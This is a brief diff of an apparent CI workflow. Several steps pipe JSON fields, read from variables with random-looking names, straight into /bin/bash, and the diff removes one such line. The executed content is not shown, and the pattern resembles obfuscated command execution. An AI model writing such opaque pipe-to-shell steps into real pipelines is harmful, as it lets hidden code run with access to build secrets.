@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$tu03027" | jq -r .copib37640 | /bin/bash
           echo $x5578 | jq -r .enchx00971 | /bin/bash
           printf '%s' "$fpyh3" | jq -r .k3952 | /bin/bash
-          printf '%s' "$csu0" | jq -r .rblo576 | /bin/bash
           echo $xssyf84 | jq -r .bpjr64 | /bin/bash
 
       - name: Upload results
